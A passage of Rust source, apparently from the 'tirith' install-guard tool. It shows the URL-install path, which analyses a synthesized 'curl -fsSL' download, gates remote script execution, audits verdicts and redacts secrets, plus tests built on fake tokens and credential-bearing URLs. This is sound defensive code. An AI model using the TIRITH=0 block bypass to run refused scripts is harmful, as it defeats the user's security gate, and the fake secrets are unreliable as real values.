    // Analyze the URL as a *download* (`curl -fsSL <url>`), NOT a pipe-to-shell
    // (which would make CurlPipeShell fire on every URL). The real script body is
    // analyzed by `runner::run` after download.
    //
    // M4 PR #120 fix-6 (CodeRabbit Major TOCTOU): `preflight_url` returns BOTH the
    // verdict AND the policy snapshot it discovered, so the bypass/agent-rules/
    // audit calls below all run against the SAME snapshot (a second
    // `Policy::discover` opened a TOCTOU window).
    let (mut preflight, policy) = preflight_url(url, cwd.as_deref(), interactive);
    tirith_core::policy::freeze_captured_policy_dlp_patterns(&policy.dlp_custom_patterns);
    let output_dlp =
        tirith_core::redact::CompiledCustomPatterns::new_silent(&policy.dlp_custom_patterns);
    if !json {
        emit_install_policy_diagnostics_human(&output_dlp);
    }

    // C12: the SAME owned download-and-launch transition `tirith run` guards.
    // Both spellings end in `runner::run_with_verified_executor`, which is where
    // `download_bounded` lives, so gating one and not the other would leave the
    // second as a way to walk around an enforcing gate by swapping two words.
    // The boundary token stays `remote_script_run` because the transition is the
    // same one, not an `install`-flavoured cousin of it.
    //
    // Placed above the preflight print, the agent-rules pass, and the audit
    // write: everything below has already resolved the policy but not yet
    // contacted a host, so a refusal here costs nothing and reveals nothing. The
    // policy is the snapshot `preflight_url` returned, so this shares the one
    // discovery the rest of the function was built around instead of opening a
    // second TOCTOU window.
    let run_assessment = {
        let envelope = tirith_core::task_boundary::shell_envelope(url);
        let operation = tirith_core::task_boundary::BoundaryOperation {
            boundary: tirith_core::task_boundary::OwnedBoundary::RemoteScriptRun,
            envelope: &envelope,
            adapter: tirith_core::task::IngressAdapter::Unattributed,
            boundary_effects: [tirith_core::effects::CommandEffectKind::NetworkEgress]
                .into_iter()
                .collect(),
        };
        tirith_core::task_boundary::evaluate(&operation, &policy.task_gate)
    };
    if let Some(reason) = run_assessment.refusal(false) {
        return report_install_task_refusal(&run_assessment, "any download", reason, &output_dlp);
    }
    // What the gate refused tightens the capsule the downloaded script would run
    // in, exactly as in `tirith run`. Empty unless the gate is enforcing.
    let task_denied_effects = run_assessment.enforced_denied_effects();

    // M4 item 8 chunk 3 — stamp the caller origin before the audit write, else
    // audit lines land in the "unknown" bucket.
    preflight.agent_origin = Some(tirith_core::agent_origin::resolve_cli_origin(interactive));

    // M4 item 8 chunk 3 — enforce `agent_rules.deny` on the URL path (no-op on
    // Allowed/Unspecified). Runs BEFORE the bypass block so a deny-forced Block
    // can still be `TIRITH=0`-bypassed. M4 PR #120 fix-6 (Greptile P1): mirror the
    // bypass-skip — under `TIRITH=0` the raw verdict wins, no re-Block. Pins:
    // `install_agent_rules_deny_skipped_under_tirith_bypass_today` (pkg) /
    // `install_url_agent_rules_deny_skipped_under_tirith_bypass_today` (url).
    if !preflight.bypass_honored {
        tirith_core::escalation::apply_agent_rules(&mut preflight, &policy);
    }

    if !json {
        print_url_preflight_human(url, &preflight, &output_dlp);
    }

    // Decide the block/bypass *before* auditing so a `TIRITH=0`-bypassed BLOCK
    // is recorded as bypassed rather than logged as `bypass_honored: false`.
    let blocked_and_refused = if preflight.action == Action::Block {
        let bypass_set = std::env::var("TIRITH").ok().as_deref() == Some("0");
        let bypass_allowed =
            policy.allow_bypass_env && (interactive || policy.allow_bypass_env_noninteractive);
        if bypass_set && bypass_allowed {
            // Bypassed — stamp so the audit entry is honest.
            preflight.bypass_requested = true;
            preflight.bypass_honored = true;
            false
        } else {
            true
        }
    } else {
        false
    };

    // A failed audit write is a non-fatal notice (the transaction proceeds).
    if let Err(e) = tirith_core::audit::log_verdict(
        &preflight,
        &format!("install url {url}"),
        None,
        None,
        &policy.dlp_custom_patterns,
    ) {
        if !json {
            let error = tirith_core::output::sanitize_human_field_with_compiled(
                &e.to_string(),
                &output_dlp,
            );
            eprintln!(
                "tirith install: audit log not written (non-fatal): {}",
                error,
            );
        }
    }

    // A blocking preflight that was not bypassed refuses before any download.
    if blocked_and_refused {
        if json {
            let _ = print_url_transaction_json(
                url,
                &preflight,
                None,
                None,
                &policy.dlp_custom_patterns,
            );
        } else {
            eprintln!(
                "tirith install: refusing to download — the URL preflight \
                 BLOCKED this transaction (see findings above)."
            );
        }
        return 1;
    }
    if preflight.action == Action::Block && !json {
        eprintln!(
            "tirith install: URL preflight BLOCK bypassed via TIRITH=0 \
             (policy permits) — proceeding against advice."
        );
    }

    // `runner::run`'s own confirmation prompt is the acknowledgement; no second
    // prompt here.
    if preflight.action != Action::Allow && !json {
        eprintln!(
            "tirith install: URL preflight raised {} finding(s) — the script \
             body will be analyzed and you will be asked to confirm before it runs.",
            preflight.findings.len()
        );
    }

    // --- RECORD + RUN: delegate to the safe runner ---
    // `runner::run` re-analyzes the downloaded script, writes a Receipt, and
    // (unless --no-exec) prompts on /dev/tty before executing.
    let opts = RunOptions {
        url: url.to_string(),
        no_exec,
        interactive,
        expected_sha256: sha256,
        // Live URL installation uses the same verified, content-bound capsule
        // executor as `tirith run`; there is no uncontained fallback.
        exec_fn: None,
    };
    let verified_executor: tirith_core::runner::VerifiedScriptExecutor =
        Box::new(move |invocation, reviewed, authorizer| {
            crate::cli::run::capsuled_exec_tightened(
                invocation,
                reviewed,
                authorizer,
                &task_denied_effects,
            )
        });
    match runner::run_with_verified_executor(opts, verified_executor) {
        Ok(result) => {
            let presentation_patterns =
                tirith_core::policy::captured_policy_dlp_patterns_or(&policy.dlp_custom_patterns);
            let json_ok = if json {
                print_url_transaction_json(
                    url,
                    &preflight,
                    Some(&result),
                    None,
                    &presentation_patterns,
                )
            } else {
                if result.executed {
                    eprintln!(
                        "tirith install: install script executed (receipt {}).",
                        tirith_core::receipt::short_hash(&result.receipt.sha256)
                    );
                } else if result.refused {
                    eprintln!(
                        "tirith install: install script execution refused by body policy (receipt {}).",
                        tirith_core::receipt::short_hash(&result.receipt.sha256)
                    );
                } else {
                    eprintln!(
                        "tirith install: install script downloaded and recorded, \
                         not executed (receipt {}).",
                        tirith_core::receipt::short_hash(&result.receipt.sha256)
                    );
                }
                true
            };
            let effective_complete = runner_effective_complete(&result);
            let outcome_code = if !effective_complete {
                1
            } else if result.executed || result.refused {
                result.exit_code.unwrap_or(1)
            } else {
                0
            };
            // A JSON-write failure must not report `0` success — surface exit 1 if
            // the outcome didn't reach the consumer (a non-zero script exit is kept).
            if !json_ok && outcome_code == 0 {
                1
            } else {
                outcome_code
            }
        }
        Err(e) => {
            let presentation_patterns =
                tirith_core::policy::captured_policy_dlp_patterns_or(&policy.dlp_custom_patterns);
            let presentation_dlp =
                tirith_core::redact::CompiledCustomPatterns::new_silent(&presentation_patterns);
            if json {
                let _ = print_url_transaction_json(
                    url,
                    &preflight,
                    None,
                    Some(e.as_str()),
                    &presentation_patterns,
                );
            } else {
                emit_install_policy_diagnostics_human(&presentation_dlp);
                let error =
                    tirith_core::output::sanitize_human_field_with_compiled(&e, &presentation_dlp);
                eprintln!("tirith install: {error}");
            }
            1
        }
    }
}

#[cfg(unix)]
fn build_live_url_json_refusal() -> serde_json::Value {
    tirith_core::verdict::bound_json_value_for_output(serde_json::json!({
        "schema_version": 2,
        "kind": "install_url",
        "action": Action::Block,
        // No URL/body analysis ran: this is an operational protocol refusal,
        // never a completed security verdict.
        "analysis_complete": false,
        "analysis_incomplete": true,
        "runner_error": false,
        "refused": true,
        "executed": false,
        "exit_code": Action::Block.exit_code(),
        "error": "install URL JSON output is inspection-only; pass --no-exec or omit --format json before executing"
    }))
}

/// On non-Unix the `url` form is unavailable (the safe runner is Unix-only);
/// npm/pip/cargo still work.
#[cfg(not(unix))]
fn run_url(
    _args: &[String],
    _online: bool,
    _offline: bool,
    _json: bool,
    _no_exec: bool,
    _sha256: Option<String>,
) -> i32 {
    eprintln!(
        "tirith install: the url form is only available on Unix. \
         Use `tirith install npm|pip|cargo` instead."
    );
    2
}

/// Single-quote a value for a synthesized POSIX shell command so it is analyzed
/// as one argument (embedded `'` → `'\''`); else a URL with `&`/`;`/backtick/
/// space would tokenize as shell syntax and produce spurious findings.
fn shell_single_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\\''"))
}

/// Analyze a URL as a download (not a pipe-to-shell) and return the verdict.
/// Unit-testable without the network — offline `engine::analyze`, no fetch.
fn preflight_url(url: &str, cwd: Option<&str>, interactive: bool) -> (Verdict, Policy) {
    let ctx = AnalysisContext {
        // Download shape so a legitimate installer URL doesn't trip the
        // pipe-to-shell rule; single-quoted so shell metacharacters in the URL
        // are one argument, not syntax. The body is analyzed by the runner later.
        input: format!("curl -fsSL {}", shell_single_quote(url)),
        shell: tirith_core::tokenize::ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive,
        cwd: cwd.map(|s| s.to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
    };
    // M4 PR #120 fix-6 (CodeRabbit Major TOCTOU): return the engine-discovered
    // policy so the caller's bypass/agent-rules/audit calls share one snapshot.
    engine::analyze_returning_policy(&ctx)
}

// output

/// Strict single-line rendering for any attacker-influenced install value.
/// Raw argv, audit records, and JSON stay lossless; only terminal-facing text
/// drops control sequences, deceptive Unicode, and row-breaking newlines.
fn install_value_for_human(value: &str) -> String {
    super::sanitize_for_human_output(value, false)
}

/// Quote each structured argv token, then apply the strict terminal display
/// filter. Execution continues to use [`InstallArgv::program`] and
/// [`InstallArgv::args`] directly; this string is display-only.
#[cfg(test)]
fn install_command_for_human(argv: &InstallArgv) -> String {
    install_value_for_human(&argv.display())
}

fn install_value_for_human_with_compiled(
    value: &str,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) -> String {
    tirith_core::output::sanitize_human_field_with_compiled(value, compiled)
}

fn install_command_for_human_with_compiled(
    argv: &InstallArgv,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) -> String {
    let command = tirith_core::redact::redact_sanitize_redact_command_with_compiled(
        &argv.display(),
        compiled,
    );
    tirith_core::output::sanitize_human_field_with_compiled(&command, compiled)
}

/// A short, well-known example package per manager, for the usage hint.
fn example_package(manager: PackageManager) -> &'static str {
    match manager {
        PackageManager::Npm => "left-pad",
        PackageManager::Pip => "requests",
        PackageManager::Cargo => "ripgrep",
        PackageManager::Apt => "nginx",
        PackageManager::Brew => "ripgrep",
        PackageManager::Dnf => "httpd",
        PackageManager::Yum => "httpd",
        PackageManager::Pacman => "firefox",
        PackageManager::Scoop => "neovim",
        PackageManager::Docker => "alpine:latest",
        PackageManager::Go => "github.com/spf13/cobra@latest",
    }
}

/// Render the analysis verdict for a package-manager install (human form).
fn print_plan_human(
    plan: &InstallPlan,
    online: bool,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) {
    let s = Stream::Stderr;
    eprintln!(
        "tirith install: analyzing '{}' before running it",
        install_command_for_human_with_compiled(&plan.argv, compiled),
    );
    eprintln!("  (pre-execution install-risk analysis — not a sandbox)");
    // M6 ch1 — surface the weak-signals banner up front for adapter-less backends
    // (same string the JSON envelope embeds).
    if plan.manager.lacks_registry_adapter() {
        eprintln!("  {}", plan.manager.no_registry_adapter_banner());
    }
    eprintln!();

    if plan.packages.is_empty() {
        eprintln!("  packages: none on the command line (command-shape analysis only)");
    } else {
        eprintln!("  packages:");
        for pkg in &plan.packages {
            eprintln!(
                "    - {} {} — risk {}/100 ({})",
                pkg.reference.ecosystem,
                install_value_for_human_with_compiled(&pkg.reference.name, compiled),
                pkg.risk.score,
                pkg.risk.risk_level,
            );
            // C13: the registry identity/provenance FACTS, with the caveat that
            // makes them readable as facts. Strict npm installs may require
            // this metadata; none of it says Tirith saw the bytes.
            if let Some(dist) = npm_dist_facts_of(&pkg.risk) {
                eprintln!(
                    "      registry identity: {}",
                    install_value_for_human_with_compiled(&dist.summary(), compiled),
                );
                if dist.tarball_url_rejected {
                    eprintln!(
                        "      registry identity: tarball URL REJECTED: {}",
                        install_value_for_human_with_compiled(
                            dist.tarball_rejection_reason
                                .as_deref()
                                .unwrap_or("not bound to the registry origin"),
                            compiled,
                        ),
                    );
                }
            }
        }
    }
    eprintln!();

    match plan.verdict.action {
        Action::Allow => {
            eprintln!(
                "  {}",
                tirith_core::style::green("verdict: ALLOW — no supply-chain risks found", s)
            );
        }
        Action::Warn | Action::WarnAck => {
            eprintln!(
                "  {}",
                tirith_core::style::yellow(
                    &format!(
                        "verdict: WARN — {} finding(s), acknowledgement required",
                        plan.verdict.findings.len()
                    ),
                    s,
                )
            );
        }
        Action::Block => {
            eprintln!(
                "  {}",
                tirith_core::style::bold_red(
                    &format!(
                        "verdict: BLOCK — {} finding(s), install refused",
                        plan.verdict.findings.len()
                    ),
                    s,
                )
            );
        }
    }
    for finding in &plan.verdict.findings {
        let sev = tirith_core::style::severity_label(&finding.severity, s);
        eprintln!(
            "    {} {} — {}",
            sev,
            finding.rule_id,
            tirith_core::output::sanitize_human_field_with_compiled(&finding.title, compiled)
        );
        eprintln!(
            "      {}",
            tirith_core::output::sanitize_human_field_with_compiled(&finding.description, compiled)
        );
    }

    if !plan.notes.is_empty() {
        eprintln!();
        eprintln!("  notes:");
        for note in &plan.notes {
            eprintln!(
                "    - {}",
                install_value_for_human_with_compiled(note, compiled)
            );
        }
    }
    if !online && !plan.packages.is_empty() {
        eprintln!();
        eprintln!(
            "  (offline analysis — re-run with --online to add registry-API \
             provenance signals)"
        );
    }
    eprintln!();
}

/// Write `value` as pretty JSON to stdout, returning `false` on a write failure
/// so the caller can exit non-zero. Thin wrapper over [`super::write_json_stdout`]
/// with the `tirith install` error prefix.
fn write_json_stdout<T: serde::Serialize>(value: &T) -> bool {
    super::write_json_stdout(value, "tirith install: failed to write JSON output")
}

/// Render the URL-form preflight verdict (human form).
fn print_url_preflight_human(
    url: &str,
    verdict: &Verdict,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) {
    let s = Stream::Stderr;
    eprintln!("tirith install: preflight analysis of install URL");
    eprintln!(
        "  url: {}",
        crate::cli::sanitize_provenance_url_with_compiled(url, compiled)
    );
    eprintln!("  (pre-execution URL-risk analysis — the script body is analyzed after download; not a sandbox)");
    match verdict.action {
        Action::Allow => {
            eprintln!("  {}", tirith_core::style::green("preflight: ALLOW", s));
        }
        Action::Warn | Action::WarnAck => {
            eprintln!(
                "  {}",
                tirith_core::style::yellow(
                    &format!("preflight: WARN — {} finding(s)", verdict.findings.len()),
                    s,
                )
            );
        }
        Action::Block => {
            eprintln!(
                "  {}",
                tirith_core::style::bold_red(
                    &format!("preflight: BLOCK — {} finding(s)", verdict.findings.len()),
                    s,
                )
            );
        }
    }
    for finding in &verdict.findings {
        let sev = tirith_core::style::severity_label(&finding.severity, s);
        eprintln!(
            "    {} {} — {}",
            sev,
            finding.rule_id,
            tirith_core::output::sanitize_human_field_with_compiled(&finding.title, compiled)
        );
        eprintln!(
            "      {}",
            tirith_core::output::sanitize_human_field_with_compiled(&finding.description, compiled,)
        );
    }
}

/// The URL form emits one trusted JSON document. Live JSON execution is refused
/// before network access, while inspection mode combines URL preflight and body
/// outcome instead of streaming two unrelated JSON objects.
#[cfg(unix)]
fn print_url_transaction_json(
    url: &str,
    preflight: &Verdict,
    result: Option<&runner::RunResult>,
    error: Option<&str>,
    dlp_custom_patterns: &[String],
) -> bool {
    let out = build_url_transaction_json(url, preflight, result, error, dlp_custom_patterns);
    write_json_stdout(&out)
}

#[cfg(unix)]
fn build_url_transaction_json(
    url: &str,
    preflight: &Verdict,
    result: Option<&runner::RunResult>,
    error: Option<&str>,
    dlp_custom_patterns: &[String],
) -> serde_json::Value {
    let compiled = tirith_core::redact::CompiledCustomPatterns::new_silent(dlp_custom_patterns);
    let preflight_presentation = crate::cli::prepare_verdict_presentation(preflight, &compiled);
    let outcome_presentation = result
        .and_then(|result| result.verdict.as_ref())
        .map(|verdict| crate::cli::prepare_verdict_presentation(verdict, &compiled));
    let outcome_original = outcome_presentation
        .as_ref()
        .map(|presentation| presentation.original_findings_count)
        .unwrap_or(0);
    let outcome_presented = outcome_presentation
        .as_ref()
        .map(|presentation| presentation.presented_findings_count)
        .unwrap_or(0);
    let outcome_dropped = outcome_presentation
        .as_ref()
        .map(|presentation| presentation.dropped_findings_count)
        .unwrap_or(0);
    let effective_complete = result.map(runner_effective_complete);
    let claimed_complete_without_verdict =
        result.is_some_and(|result| result.analysis_complete && result.verdict.is_none());
    let outcome = result.map(|result| {
        let effective_complete = effective_complete.unwrap_or(false);
        let receipt = result
            .presentation_receipt_with_compiled(&compiled)
            .public_view();
        let body_action = if effective_complete {
            outcome_presentation
                .as_ref()
                .map(|presentation| presentation.verdict.action)
                .unwrap_or(Action::Allow)
        } else {
            Action::Block
        };
        serde_json::json!({
            "receipt": receipt,
            "verdict": outcome_presentation.as_ref().map(|presentation| &presentation.verdict),
            "action": body_action,
            "original_findings_count": outcome_original,
            "presented_findings_count": outcome_presented,
            "dropped_findings_count": outcome_dropped,
            "analysis_complete": effective_complete,
            "analysis_incomplete": !effective_complete,
            // An incomplete --no-exec inspection is nonexecuting, not a
            // refusal. Only preserve a real runner refusal or fail closed on
            // the internally inconsistent complete-without-verdict claim.
            "refused": result.refused || claimed_complete_without_verdict,
            "executed": effective_complete && result.executed,
            "exit_code": if effective_complete {
                result.exit_code
            } else {
                Some(Action::Block.exit_code())
            },
        })
    });
    let original_findings_count = preflight_presentation
        .original_findings_count
        .saturating_add(outcome_original);
    let presented_findings_count = preflight_presentation
        .presented_findings_count
        .saturating_add(outcome_presented);
    let dropped_findings_count = preflight_presentation
        .dropped_findings_count
        .saturating_add(outcome_dropped);
    let redacted_error = error
        .map(|value| tirith_core::redact::redact_sanitize_redact_with_compiled(value, &compiled));
    let runner_error = error.is_some();
    let runner_incomplete = effective_complete.is_some_and(|complete| !complete);
    let body_action = if runner_incomplete {
        Action::Block
    } else {
        outcome_presentation
            .as_ref()
            .map(|presentation| presentation.verdict.action)
            .unwrap_or(Action::Allow)
    };
    let mut transaction_action =
        stronger_action(preflight_presentation.verdict.action, body_action);
    if runner_error || runner_incomplete {
        transaction_action = Action::Block;
    }
    let transaction_analysis_complete = !runner_error && !runner_incomplete;
    let preflight_refused =
        preflight_presentation.verdict.action == Action::Block && !preflight.bypass_honored;
    let transaction_refused = if runner_error || claimed_complete_without_verdict {
        true
    } else {
        result
            .map(|result| result.refused)
            .unwrap_or(preflight_refused)
    };
    let transaction_executed = !runner_error
        && !runner_incomplete
        && result.map(|result| result.executed).unwrap_or(false);
    let transaction_exit_code = if runner_error || runner_incomplete {
        Some(Action::Block.exit_code())
    } else {
        result
            .and_then(|result| result.exit_code)
            .or_else(|| transaction_refused.then_some(Action::Block.exit_code()))
    };
    let mut out = serde_json::json!({
        "schema_version": 2,
        "kind": "install_url",
        "url": crate::cli::sanitize_provenance_url_with_compiled(url, &compiled),
        "execution_policy": "contained_by_default",
        "action": transaction_action,
        "analysis_complete": transaction_analysis_complete,
        "analysis_incomplete": !transaction_analysis_complete,
        "runner_error": runner_error,
        "refused": transaction_refused,
        "executed": transaction_executed,
        "exit_code": transaction_exit_code,
        "preflight": preflight_presentation.verdict,
        "outcome": outcome,
        "error": redacted_error,
        "original_findings_count": original_findings_count,
        "presented_findings_count": presented_findings_count,
        "dropped_findings_count": dropped_findings_count,
    });
    append_install_policy_diagnostics_json(&mut out, &compiled);
    tirith_core::redact::redact_json_strings(&mut out, &compiled);
    tirith_core::verdict::bound_json_value_for_output(out)
}

fn emit_install_policy_diagnostics_human(compiled: &tirith_core::redact::CompiledCustomPatterns) {
    for diagnostic in tirith_core::policy::drain_captured_policy_diagnostics_for_output(compiled) {
        let diagnostic =
            tirith_core::output::sanitize_human_field_with_compiled(&diagnostic, compiled);
        eprintln!("tirith install: policy diagnostic: {diagnostic}");
    }
}

fn append_install_policy_diagnostics_json(
    value: &mut serde_json::Value,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) {
    let diagnostics = tirith_core::policy::drain_captured_policy_diagnostics_for_output(compiled);
    if diagnostics.is_empty() {
        return;
    }
    if let Some(object) = value.as_object_mut() {
        object.insert(
            "policy_diagnostics_count".to_string(),
            diagnostics.len().into(),
        );
        object.insert(
            "policy_diagnostics".to_string(),
            serde_json::json!(diagnostics),
        );
    }
}

#[cfg(unix)]
fn runner_effective_complete(result: &runner::RunResult) -> bool {
    result.analysis_complete && result.verdict.is_some()
}

#[cfg(unix)]
fn stronger_action(left: Action, right: Action) -> Action {
    if left.rank() > right.rank() {
        left
    } else if right.rank() > left.rank() {
        right
    } else if matches!(left, Action::WarnAck) || matches!(right, Action::WarnAck) {
        Action::WarnAck
    } else {
        left
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;
    use tirith_core::verdict::{Finding, RuleId, Severity};

    #[test]
    fn package_manager_pipe_reader_discards_prefix_after_cap_and_drains_exactly() {
        let source = vec![b'x'; MAX_PACKAGE_MANAGER_PIPE_BYTES + 7_777];
        let projected = read_package_manager_pipe_bounded(std::io::Cursor::new(source)).unwrap();
        assert_eq!(
            projected,
            format!(
                "[child output truncated: omitted_bytes={}, max_stream_bytes={MAX_PACKAGE_MANAGER_PIPE_BYTES}]",
                MAX_PACKAGE_MANAGER_PIPE_BYTES + 7_777
            )
        );
        assert!(!projected.contains("xxxxxxxx"));
    }

    #[cfg(unix)]
    #[test]
    fn package_manager_capture_drains_both_pipes_and_preserves_exit_status() {
        let mut command = Command::new("/bin/sh");
        command.args(["-c", "printf '%200000s' x; printf '%200000s' y >&2; exit 7"]);

        let output = capture_package_manager_output_bounded(&mut command).unwrap();
        assert_eq!(output.exit_code, Some(7));
        let stdout = output.stdout.unwrap();
        let stderr = output.stderr.unwrap();
        assert!(stdout.contains("child output truncated"));
        assert!(stderr.contains("child output truncated"));
        assert!(stdout.len().saturating_add(stderr.len()) <= MAX_PACKAGE_MANAGER_JSON_CHILD_BYTES);
    }

    #[cfg(unix)]
    #[test]
    fn live_url_json_protocol_refusal_has_complete_nonexecution_schema() {
        let value = build_live_url_json_refusal();
        assert_eq!(value["action"], "block");
        assert_eq!(value["analysis_complete"], false);
        assert_eq!(value["analysis_incomplete"], true);
        assert_eq!(value["runner_error"], false);
        assert_eq!(value["refused"], true);
        assert_eq!(value["executed"], false);
        assert_eq!(value["exit_code"], 1);
        assert!(
            serde_json::to_vec(&value).unwrap().len()
                <= tirith_core::verdict::MAX_PRESENTATION_BYTES
        );
    }

    #[cfg(unix)]
    #[test]
    fn install_url_json_redacts_url_and_error_with_frozen_plan() {
        let canary = "C02_INSTALL_URL_CANARY";
        let github = format!("ghp_{}", "a1B2c3D4".repeat(5));
        let provider_token = "provider-token-0123456789";
        let patterns = vec![regex::escape(canary)];
        let preflight = Verdict::allow_fast(1, Default::default());
        let value = build_url_transaction_json(
            &format!(
                "https://user:password@mainnet.infura.io/v3/{provider_token}?token={canary}#fragment"
            ),
            &preflight,
            None,
            Some(&format!(
                "download failed for {}\u{200b}{} and {}\u{1b}[31m{}",
                &canary[..11],
                &canary[11..],
                &github[..18],
                &github[18..]
            )),
            &patterns,
        );
        let serialized = serde_json::to_string(&value).unwrap();

        for secret in [canary, provider_token, "user:password"] {
            assert!(
                !serialized.contains(secret),
                "install URL JSON leaked {secret}"
            );
        }
        assert!(!serialized.contains(&github));
        assert_eq!(value["url"], "https://infura.io/v3");
        let error = value["error"].as_str().unwrap();
        assert!(error.contains("[REDACTED:custom]"), "{error}");
        assert!(error.contains("[REDACTED:GitHub PAT]"), "{error}");
    }

    #[cfg(unix)]
    #[test]
    fn install_url_nested_receipt_uses_shared_url_dlp_and_body_block_wins() {
        let canary = "C02_INSTALL_RECEIPT_CANARY";
        let provider_token = "provider-token-0123456789";
        let patterns = vec![regex::escape(canary)];
        let _capture = tirith_core::policy::PolicyDiagnosticCapture::start();
        tirith_core::policy::freeze_captured_policy_dlp_patterns(&[]);
        tirith_core::policy::freeze_captured_policy_dlp_patterns(&patterns);
        let presentation_patterns = tirith_core::policy::captured_policy_dlp_patterns_or(&[]);
        let preflight = Verdict::allow_fast(1, Default::default());
        let body = Verdict::from_findings(
            vec![Finding {
                rule_id: RuleId::PrivateKeyExposed,
                severity: Severity::Critical,
                title: "body block".to_string(),
                description: "no-exec body decision".to_string(),
                evidence: Vec::new(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            3,
            Default::default(),
        );
        let result = runner::RunResult {
            receipt: tirith_core::receipt::Receipt {
                url: format!(
                    "https://user:password@mainnet.infura.io/v3/{provider_token}?token={canary}#fragment"
                ),
                final_url: Some(format!(
                    "https://eth-mainnet.g.alchemy.com/v2/{provider_token}?token={canary}"
                )),
                redirects: vec![format!(
                    "https://rpc.ankr.com/eth/{provider_token}?token={canary}"
                )],
                sha256: "d".repeat(64),
                size: 1,
                domains_referenced: vec!["example.test".to_string()],
                paths_referenced: vec![format!("/private/{canary}/wallet.json")],
                analysis_method: "policy-complete:sh".to_string(),
                privilege: "normal".to_string(),
                timestamp: "2026-08-09T00:00:00Z".to_string(),
                cwd: Some(format!("/private/{canary}")),
                git_repo: Some(format!(
                    "https://user:password@github.com/org/repo?token={canary}#fragment"
                )),
                git_branch: Some(format!("branch-{canary}")),
            },
            verdict: Some(body),
            analysis_complete: true,
            refused: false,
            executed: false,
            exit_code: None,
        };

        let value = build_url_transaction_json(
            "https://example.test/install.sh",
            &preflight,
            Some(&result),
            None,
            &presentation_patterns,
        );
        let serialized = serde_json::to_string(&value).unwrap();

        assert_eq!(value["action"], "block");
        assert_eq!(value["outcome"]["action"], "block");
        assert_eq!(value["refused"], false);
        assert_eq!(value["executed"], false);
        for secret in [
            canary,
            provider_token,
            "user:password",
            "token=",
            "#fragment",
        ] {
            assert!(
                !serialized.contains(secret),
                "nested receipt leaked {secret}"
            );
        }
        assert!(serialized.contains("[REDACTED:custom]"));
    }

    #[cfg(unix)]
    #[test]
    fn install_url_runner_error_is_explicit_and_identical_after_fallback() {
        let canary = "C02_INSTALL_RUNNER_ERROR_CANARY";
        let patterns = vec![regex::escape(canary)];
        let preflight = Verdict::allow_fast(1, Default::default());
        let ordinary = build_url_transaction_json(
            "https://example.test/install.sh",
            &preflight,
            None,
            Some(&format!("runner failed for {canary}")),
            &patterns,
        );
        let error = format!("runner failed for {canary}: {}", "flood".repeat(100_000));

        let fallback = build_url_transaction_json(
            "https://example.test/install.sh",
            &preflight,
            None,
            Some(&error),
            &patterns,
        );
        let ordinary_text = serde_json::to_string(&ordinary).unwrap();
        let pretty = serde_json::to_string_pretty(&fallback).unwrap();

        assert!(pretty.len() < tirith_core::verdict::MAX_PRESENTATION_BYTES);
        assert!(!ordinary_text.contains(canary));
        assert!(!pretty.contains(canary));
        for field in [
            "action",
            "analysis_complete",
            "analysis_incomplete",
            "runner_error",
            "refused",
            "executed",
            "exit_code",
        ] {
            assert_eq!(
                fallback["summary"][field], ordinary[field],
                "compact fallback changed transaction field {field}"
            );
        }
        assert_eq!(ordinary["action"], "block");
        assert_eq!(ordinary["analysis_complete"], false);
        assert_eq!(ordinary["analysis_incomplete"], true);
        assert_eq!(ordinary["runner_error"], true);
        assert_eq!(ordinary["refused"], true);
        assert_eq!(ordinary["executed"], false);
        assert_eq!(ordinary["exit_code"], 1);
    }

    #[cfg(unix)]
    #[test]
    fn install_url_incomplete_no_exec_is_block_action_nonexecuted_and_exit_one() {
        let preflight = Verdict::allow_fast(1, Default::default());
        let patterns = vec!["C02_INSTALL_INCOMPLETE_PATTERN".to_string()];
        let result = runner::RunResult {
            receipt: tirith_core::receipt::Receipt {
                url: "https://example.test/install.sh".to_string(),
                final_url: None,
                redirects: Vec::new(),
                sha256: "e".repeat(64),
                size: 1,
                domains_referenced: Vec::new(),
                paths_referenced: (0..2_000)
                    .map(|index| format!("/incomplete-flood/{index}/{}", "x".repeat(200)))
                    .collect(),
                analysis_method: "static-incomplete:unsupported-interpreter".to_string(),
                privilege: "normal".to_string(),
                timestamp: "2026-08-09T00:00:00Z".to_string(),
                cwd: None,
                git_repo: None,
                git_branch: None,
            },
            verdict: None,
            analysis_complete: false,
            refused: false,
            executed: false,
            exit_code: None,
        };

        let value = build_url_transaction_json(
            "https://example.test/install.sh",
            &preflight,
            Some(&result),
            None,
            &patterns,
        );

        let pretty = serde_json::to_string_pretty(&value).unwrap();
        assert!(pretty.len() < tirith_core::verdict::MAX_PRESENTATION_BYTES);
        assert_eq!(value["summary"]["action"], "block");
        assert_eq!(value["summary"]["analysis_complete"], false);
        assert_eq!(value["summary"]["analysis_incomplete"], true);
        assert_eq!(value["summary"]["runner_error"], false);
        assert_eq!(value["summary"]["refused"], false);
        assert_eq!(value["summary"]["executed"], false);
        assert_eq!(value["summary"]["exit_code"], 1);
    }

    #[cfg(unix)]
    #[test]
    fn install_url_claimed_complete_without_verdict_fails_closed_everywhere() {
        let preflight = Verdict::allow_fast(1, Default::default());
        let result = runner::RunResult {
            receipt: tirith_core::receipt::Receipt {
                url: "https://example.test/install.sh".to_string(),
                final_url: None,
                redirects: Vec::new(),
                sha256: "f".repeat(64),
                size: 1,
                domains_referenced: Vec::new(),
                paths_referenced: Vec::new(),
                analysis_method: "claimed-complete-without-verdict".to_string(),
                privilege: "normal".to_string(),
                timestamp: "2026-08-10T00:00:00Z".to_string(),
                cwd: None,
                git_repo: None,
                git_branch: None,
            },
            verdict: None,
            analysis_complete: true,
            refused: false,
            executed: true,
            exit_code: Some(0),
        };

        assert!(!runner_effective_complete(&result));
        let value = build_url_transaction_json(
            "https://example.test/install.sh",
            &preflight,
            Some(&result),
            None,
            &[],
        );

        assert_eq!(value["action"], "block");
        assert_eq!(value["analysis_complete"], false);
        assert_eq!(value["analysis_incomplete"], true);
        assert_eq!(value["refused"], true);
        assert_eq!(value["executed"], false);
